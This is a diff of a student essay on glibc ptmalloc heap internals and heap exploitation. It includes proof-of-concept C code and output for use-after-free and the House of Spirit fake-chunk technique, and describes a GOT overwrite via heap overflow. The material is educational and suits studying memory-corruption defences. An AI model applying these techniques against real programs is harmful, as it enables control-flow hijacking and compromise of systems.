@@ -2,7 +2,7 @@
 title: "Protecting the Heap"
 subtitle: "Exploit Development (ZEIT8042) Major Essay"
 date: "September 2019"
-author: "Benjamin Simmonds (5233344) -- UNSW Canberra"
+author: "Benjamin Simmonds (5233344) UNSW Canberra"
 abstract: "So it turns out the heap is dangerous."
 ---
 
@@ -16,6 +16,7 @@ modern exploit mitigation control at a technical
 level, specifically addressing current academic 
 and industry literature pertaining to the
 strengths and weaknesses of the control. -->
+
 
 
 
@@ -62,24 +63,24 @@ Tracing the kernel syscalls that are involved, can see that `mmap2()` and `brk()
     # strace ./simple
     execve("./simple", ["./simple"], [/* 16 vars */]) = 0
     brk(0)                                  = 0x8b5a000
-    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
-    mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7707000
-    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or direct...
+    mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) =...
+    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or direct...
     open("/etc/ld.so.cache", O_RDONLY)      = 3
     fstat64(3, {st_mode=S_IFREG|0644, st_size=17310, ...}) = 0
     mmap2(NULL, 17310, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7702000
     close(3)                                = 0
-    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or direct...
     open("/lib/i386-linux-gnu/i686/cmov/libc.so.6", O_RDONLY) = 3
-    read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\240o\1\0004\0\0\0"..., 512) = 512
+    read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\240o\1\0004\0\0\0"...
     fstat64(3, {st_mode=S_IFREG|0755, st_size=1437864, ...}) = 0
-    mmap2(NULL, 1452408, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb759f000
+    mmap2(NULL, 1452408, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) ...
     mprotect(0xb76fb000, 4096, PROT_NONE)   = 0
-    mmap2(0xb76fc000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x15c) = 0xb76fc000
-    mmap2(0xb76ff000, 10616, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb76ff000
+    mmap2(0xb76fc000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DE...
+    mmap2(0xb76ff000, 10616, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_AN...
     close(3)                                = 0
-    mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb759e000
-    set_thread_area({entry_number:-1 -> 6, base_addr:0xb759e8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0,     limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+    mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) =...
+    set_thread_area({entry_number:-1 -> 6, base_addr:0xb759e8d0, limit:1048575,...
     mprotect(0xb76fc000, 8192, PROT_READ)   = 0
     mprotect(0xb7726000, 4096, PROT_READ)   = 0
     munmap(0xb7702000, 17310)               = 0
@@ -98,6 +99,7 @@ While there is no single defacto heap allocator, most platforms congrete around 
 * `jemalloc` FreeBSD
 * `tcmalloc` Google
 * `libumem` Sun Solaris
+* `kmalloc` Linux kernel allocator used for small chunks
 
 
 
@@ -105,7 +107,7 @@ While there is no single defacto heap allocator, most platforms congrete around 
 ## Understanding the ptmalloc (glibc) heap
 
 
-the Doug Lea implmentation adapted to multiple threads/arenas by Wolfram Gloger.
+The `ptmalloc` code base is a decendant of the Doug Lea `dlmalloc` implmentation, adapted to support multiple threads and arenas by Wolfram Gloger.
 
 As a general purpose heap allocator provided by glibc, the designers had to strike a balance between performance and memory efficiency. As stated in @glibcsource:
 
@@ -119,7 +121,10 @@ Some properties of the `ptmalloc2` algorithm are:
 * For very large requests (>= 128KB by default), it relies on system memory mapping (`mmap`) facilities, if supported.
 
 
-TODO: Include decision tree image of malloc implementation.
+
+![ptmalloc logic tree](ptmalloc.png)
+
+
 
 
 When a chunk is requested, the *first-fit algorithm* will try to find the first chunk that is both free and large enough. Or more concretely @how2heap shows how this deterministic behaviour can be used to control the data at a previously freed allocation:
@@ -131,7 +136,6 @@ When a chunk is requested, the *first-fit algorithm* will try to find the first 
 
 int main()
 {
-	fprintf(stderr, "Allocating 2 buffers. They can be large, don't have to be fastbin.\n");
 	char* a = malloc(512);
 	char* b = malloc(256);
 	char* c;
@@ -139,14 +143,14 @@ int main()
 	fprintf(stderr, "1st malloc(512): %p\n", a);
 	fprintf(stderr, "2nd malloc(256): %p\n", b);
 	fprintf(stderr, "we could continue mallocing here...\n");
-	fprintf(stderr, "now let's put a string at a that we can read later \"this is A!\"\n");
+	fprintf(stderr, "set a to \"this is A!\"\n");
 	strcpy(a, "this is A!");
 	fprintf(stderr, "first allocation %p points to %s\n", a, a);
 
 	fprintf(stderr, "Freeing the first one...\n");
 	free(a);
 
-	fprintf(stderr, "We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n", a);
+	fprintf(stderr, "if allocate < 512, it will end up at %p\n", a);
 	fprintf(stderr, "So, let's allocate 500 bytes\n");
 	c = malloc(500);
 	fprintf(stderr, "3rd malloc(500): %p\n", c);
@@ -154,7 +158,6 @@ int main()
 	strcpy(c, "this is C!");
 	fprintf(stderr, "3rd allocation %p points to %s\n", c, c);
 	fprintf(stderr, "first allocation %p points to %s\n", a, a);
-	fprintf(stderr, "If we reuse the first allocation, it now holds the data from the third allocation.\n");
 }
 ```
 
@@ -162,25 +165,23 @@ int main()
 Output:
 
     # ./simple
-    Allocating 2 buffers. They can be large, don't have to be fastbin.
     1st malloc(512): 0x8445008
     2nd malloc(256): 0x8445210
     we could continue mallocing here...
-    now let's put a string at a that we can read later "this is A!"
+    set a to "this is A!"
     first allocation 0x8445008 points to this is A!
     Freeing the first one...
-    We don't need to free anything again. As long as we allocate less than 512, it will end up at 0x8445008
+    if allocate < 512, it will end up at 0x8445008
     So, let's allocate 500 bytes
     3rd malloc(500): 0x8445008
     And put a different string here, "this is C!"
     3rd allocation 0x8445008 points to this is C!
     first allocation 0x8445008 points to this is C!
-    If we reuse the first allocation, it now holds the data from the third allocation.
 
 This is known as a *use-after-free* vulnerability.
 
 
-### Multiple threads and arenas
+## Multiple threads and arenas
 
 `ptmalloc` being a multi threaded and arena adaption of the original Doug Lea heap allocator, allows it to undertake concurrent heap memory management activities, without blocking one thread while another thread requests a `malloc()` or `free()`.
 
@@ -269,17 +270,10 @@ Straight after `malloc` is invoked, as can be seen below, the magic of the `brk(
     b7744000-b7745000 rw-p 0001c000 08:01 391702     /lib/i386-linux-gnu/ld-2.13.so
     bfe99000-bfeba000 rw-p 00000000 00:00 0          [stack]
 
-Unpacking this memory mapping further, can see the heap segment seems quite large, given only 1000 bytes was requested:
-
-    08c6a000-08c8b000 rw-p 00000000 00:00 0          [heap]
-
-In decimal, equates to 135,168 bytes (or 132KB):
-
-    0x08c8b000 - 0x08c6a000 = 135168
-    132 * 1024 = 135168
 
 
-While seeing the highlevel heap segments is useful, visualising the specific chunks within the heap would be even more useful. There are some excellent options available, for example using gdb paired with the `libheap` (@libheap) extension library arms gdb with heap visualisation abilities. Below can see two chunks exist on the heap, the special *top chunk*, and the 1000 (0x3f0) byte chunk that was requested using first `malloc()` in the above program:
+
+While seeing the high level heap segments is useful, visualising the specific chunks within the heap would be even more useful. There are some excellent options available, for example using gdb paired with the `libheap` (@libheap) extension library arms gdb with heap visualisation abilities. Below can see two chunks exist on the heap, the special *top chunk*, and the 1000 (0x3f0) byte chunk that was requested using first `malloc()` in the above program:
 
     gdb-peda$ heapls
                ADDR             SIZE            STATUS
@@ -289,22 +283,33 @@ While seeing the highlevel heap segments is useful, visualising the specific chu
     sbrk_end   0x804a000
 
 
+The heap segment seems quite large, given only 1000 bytes was requested:
+
+    08c6a000-08c8b000 rw-p 00000000 00:00 0          [heap]
+
+In decimal, equates to 135,168 bytes (or 132KB):
+
+    0x08c8b000 - 0x08c6a000 = 135168
+    132 * 1024 = 135168
+
+
+
 
 ## Arenas
 
-It turns out looking at `malloc.c` that 132KB of heap memory was reserved, regardless that only 1000 bytes was initally requested. This continigous block of memory is known commonly by heap allocators as the *main arena*. The `ptmalloc` allocator will utilise and manage memory from the *main arena* for future allocation requests that come in, re-allocated previously used memory that is no longer needed and growing or shrinking the *main arena* by adjusting the heap segment break location.
+It turns out looking at `malloc.c` that 132KB of heap memory was reserved, regardless that only 1000 bytes was initally requested. This continigous block of memory is known commonly by heap allocators as the *main arena*. The `ptmalloc` allocator will utilise and manage memory from the *main arena* for future allocation requests that come in, re-allocated previously used memory that is no longer needed and growing or shrinking the *main arena* by adjusting the heap segment break location (@kapil).
 
 The *arena* enables allocators abstract the continguous block of memory used to service heap requests, and provides an in-between caching layer so that the kernel doesn't have to get involved every time heap memory is allocated or freed. When a block of previously allocated memory is freed, it returned to `ptmalloc` which organises in a free list, in the case of `ptmalloc` these are known as *bins*. When a subsequent memory request is made, `ptmalloc` will scan its bins for a free block of the size needed. If it fails to locate a free block of the appropriate size, elevates to the kernel to ask for more memory.
 
 What is facinating about the `ptmalloc` allocator, is that when another thread `pthread_create(&t1, NULL, threadFunc, NULL)` makes a memory request using `malloc`, is that a completely new heap segment is created specifically for use by the thread, as can be seen below:
 
     # cat /proc/2685/maps
-    08048000-08049000 r-xp 00000000 08:01 653369     /root/code/arena/arena
-    08049000-0804a000 rw-p 00000000 08:01 653369     /root/code/arena/arena
-    0804a000-0806b000 rw-p 00000000 00:00 0          [heap]
+    08048000-08049000 r-xp 00000000 08:01 653369  /root/code/arena/arena
+    08049000-0804a000 rw-p 00000000 08:01 653369  /root/code/arena/arena
+    0804a000-0806b000 rw-p 00000000 00:00 0       [heap]
     b7635000-b7636000 ---p 00000000 00:00 0
     b7636000-b7e37000 rw-p 00000000 00:00 0
-    b7e37000-b7f93000 r-xp 00000000 08:01 395842     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+    b7e37000-b7f93000 r-xp 00000000 08:01 395842  /lib/cmov/libc-2.13.so
 
 This new thread specific heap segment is commonly referred to as the *thread arena*.
 
@@ -323,8 +328,9 @@ A program running on a single core 32-bit system, will have a *main arena* and u
 In the case of `ptmalloc` the `heap_info` and `malloc_state` data structures are used to represent the concept of an arena.
 
 
+# Data structures
 
-### Heap header
+## Heap header
 
 The **heap_info** represents the allocated memory for a *thread arena* heap allocation. Unlike a *main arena*, which is statically defined as a global variable in `libc.so` data segment, a *thread arena* is materialised at runtime, including it `heap_info` (heap header) and `malloc_state` (arena header). Given this, a *main arena* is never represented with a `heap_info` header.
 
@@ -339,7 +345,7 @@ struct heap_info
 ```
 
 
-### Arena header
+## Arena header
 
 **malloc_state** represents an arena (both main and thread), which involves one or more heaps, and the freelist bins which relate to this memory, so that freed memory can be later reallocated.
 
@@ -397,7 +403,7 @@ When exact free chunk sizes are not available, and there sufficient larger chunk
 
 ### Allocated chunk
 
-A chunk that's been reserved for use.
+A chunk that's been reserved for use (@kaempf):
 
     +----------------------------------+
     |  If prior chunk free, then size  | <---+ chunk
@@ -421,7 +427,7 @@ If the previous chunk is free (which is doesn't have to be), the size of it is s
 
 Unlike an allocated chunk, is heap memory that is available for re-allocation. Free chunks can never reside next to another free chunk. The allocator always coalesces adjacent free chunks together.
 
-As can be seen below, a free chunk must always be preceded by an allocated chunk, therefore its `mchunk_prev_size` will always have user data from the previous allocated chunk.
+As can be seen below, a free chunk must always be preceded by an allocated chunk, therefore its `mchunk_prev_size` will always have user data from the previous allocated chunk (@kaempf).
 
 
     +-------------------------------+
@@ -463,6 +469,7 @@ TODO: Complete this table from P10 https://www.blackhat.com/presentations/bh-usa
 
 Given that the free chunks are daisy chained together as a singly linked list, a side-effect of this is that all free chunk addition and removal operations occur at the head/front of the list (LIFO). That is, the last free chunk added to a list, will be the first one used for an allocation.
 
+\newpage
 
                      0xdeadbeef
                     +------------+------------+------------+------------+
@@ -496,11 +503,6 @@ Given that the free chunks are daisy chained together as a singly linked list, a
 
 
 
-
-
-
-
-
 ```c
 typedef struct malloc_chunk *mfastbinptr;
 
@@ -508,6 +510,7 @@ mfastbinptr fastbinsY[]; // Array of pointers to chunks
 ```
 
 Called *fast bins* because no free chunk coalescing is ever performed on adjacent *fast bin* based free chunks. The result is higher memory fragmentation (due to no compacting occurs) at the tradeoff of increased performance.
+
 
 
 ### Unsorted, small and large bins
@@ -540,22 +543,16 @@ Each bin (i.e. unsorted, small and large) is defined as two values, the head and
 
 
 
-
-
-
-
-
 # Common Vulnerabilities
 
-A given heap allocators has a broad attack surface. This surface is exponentially increased as multiple heap allocator implementations across languages and platforms is considered. There are many common heap allocators widely used out there, `ptmalloc2` being just one. Implementation differences aside do have some themes in common. 
+Heap allocators have a broad attack surface. This surface is significantly widens as multiple heap allocator implementations across languages and platforms are considered, with `ptmalloc` being just one. Implementation differences aside do have some themes in common. The *how2heap* (@how2heap) repository, thoroughly documents glibc `ptmalloc` heap vulnerabilities.
 
-TODO: Summarise this ptmalloc security matrix https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks.html
+A whole family of attacks focuses on exploiting the allocator algorithms itself, such as a particular fastbin or smallbin implementation. Once employed to goal is to establishing an arbitrary (or close to it) pointer and/or arbitrary code execution. Arbitrary pointers are particularly dangerous, as they can be used to manipulate and often own control flow of the target program. One particurly example of this is the *house of spirit* exploit walked through below.
+
+To highlight the diversity and breadth of attacks posssible on the heap, here I consider three different categories of attack on the glibc heap allocator, starting with a simple overflow to attack control flow, a double free attack and finally a more sophisticated attack that involves storing specially crafted fake heap chunks in fastbins.
 
 
-
-
-
-## Heap overflow
+## Heap overflows
 
 Given heap memory is mapped as a dedicated R/W segment, the overflow, not dissimilar to a buffer overflow, attempts to influence the control flow of a vulnerable program, by flooding the necessary pieces of heap memory.
 
@@ -746,7 +743,7 @@ The second one has been damaged badly by the overflow:
     gdb-peda$ print *$i2
     $5 = {
       priority = 0x45454545,
-      name = 0x8049844 "փ\004\b\346\203\004\b`\335", <incomplete sequence \350\267>
+      name = 0x8049844 "\004\b\346\203\004\b`\335", <incomplete sequence \350\267>
     }
 
 Given that i2->name points to the GOT entry for `puts` the `strcpy(i2->name, argv[2])` will write the second argument bytes on top of the GOT offset entry, giving ownership of control flow:
@@ -808,18 +805,114 @@ Outputs:
 As expected, the chunk `0x9214008`, after being freed twice, was subsequently re-allocated twice.
 
 
-## Heap location randomisation (ASLR)
-
-Huh, ASLR for heap?
 
 
+## The House of Spirit
+
+A clever heap exploit, that builds up a *write to anywhere* primitive, by crafting a fake heap chunk and stores it back into fastbins via a `free()`. Later, the specially crafted fake chunk is is allocated back to the vulnerable program through a subsequent `malloc()` call. Control flow can be hijacked if the code that uses the second `malloc()'ed` fake chunk, attempts to mutate the user data within the fake heap chunk which is laid out on the stack (@phrack).
+
+To add a complication, `ptmalloc` performs an integrity check, which must be satisified:
+
+    if (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ
+    || __builtin_expect (chunksize (chunk_at_offset (p, size)) 
+                                    >= av->system_mem, 0))
+
+In order to bypass this check, the fake chunk's `size`, and the `size` of its the next chunk must be set. Below is a slightly modified version of @how2heap, which is effective against the latest version of glibc (2.29) as of October 2019:
+
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
+	malloc(1);
+
+	fprintf(stderr, "Setup pointer to point to a fake 'fastbin' region.\n");
+	unsigned long long *a;
+	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
+
+	fprintf(stderr, "This region (size %lu) holds two chunks\n",
+		sizeof(fake_chunks));
+
+	fprintf(stderr, "1st at %p and 2nd at %p\n",
+		&fake_chunks[1], &fake_chunks[9]);
+	
+	fake_chunks[1] = 0x40; // this is the size
+
+	// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
+	fake_chunks[9] = 0x1234; // nextsize
+
+	fprintf(stderr, "Set pointer to address of user data in fake first chunk, %p\n",
+		&fake_chunks[1]);
+
+	a = &fake_chunks[2];
+
+	fprintf(stderr, "Freeing the fake chunk\n");
+	free(a);
+
+	fprintf(stderr, "malloc will return fake chunk at %p, user data offset at %p!\n",
+		&fake_chunks[1], &fake_chunks[2]);
+
+	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
+}
+```
+
+Output:
+
+    $ ./house_of_spirit
+    Calling malloc() once so that it sets up its memory.
+    Setup pointer to point to a fake 'fastbin' region.
+    This region (size 80) holds two chunks
+	1st at 0x7fffebe764a8 and 2nd at 0x7fffebe764e8
+    Set pointer to address of user data in fake first chunk, 0x7fffebe764a8
+    Freeing the fake chunk
+    malloc will return fake chunk at 0x7fffebe764a8, user data offset at 0x7fffebe764b0!
+    malloc(0x30): 0x7fffebe764b0
+
+
+This `chunk.size` of this region has to be 16 more than the region (to accomodate the chunk header) while still falling into the fastbin category (<= 128 on x64).
+
+This has to be the size of the next malloc request (`0x30` in this example) rounded to the internal size used by the malloc implementation. For example on x64, `0x30-0x38` will all be rounded to `0x40`, so they would work for the malloc parameter at the end.
+
+The `chunk.size` of the *next* fake region has to be set to bypass the glibc security check. That is `> 2*SIZE_SZ` (> 16 on x64) && `< av->system_mem` (< 128KB by default for the main arena) to pass the nextsize integrity checks.
+
+So that the fake chunk is handled correctly by glibc, before the fake chunk is `free()ed` using the pointer, the pointer is set to the user data region within the fake first chunk (i.e. it is not set to the address of the chunk header itself, but the user data within the chunk). This is because glibc will attempt to look at the chunk header later, by subtracting the chunk header offset from the user data.
+
+Finally in order to make this work the memory the of the crafted fake chunk must be 16-byte aligned, as glibc would do for chunks it produces.
+
+
+While the above @how2heap example does nothing harmful, it easy to imagine how an arbitary memory location could be corrupted with this technique. @phrack for example walks through laying out the fake chunk over stack, to gain control of the EIP:
+
+                     val1         target                val2
+                      o             |                     o
+        -64           |  mem  -4    0   +4  +8  +12 +16   |
+         |            |   |    |    |    |   |   |   |    |
+    .....][P_SIZE][size+8][...][EBP][EIP][..][..][..][next_size][ ......
+                      |   |                           |
+                      o---|---------------------------o
+                          |      (size + 8) bytes
+                         PTR1
+                          |---> Future PTR2
+                                       ----
+  
+     (target) Value to overwrite.
+     (mem)  Data of fakechunk.
+     (val1) Size of fakechunk.
+     (val2) Size of next chunk.
+
+
+
+
+
+# Mitigation Controls
 
 
 
 
 
 
-# Commercial Feasibility
 
 
 
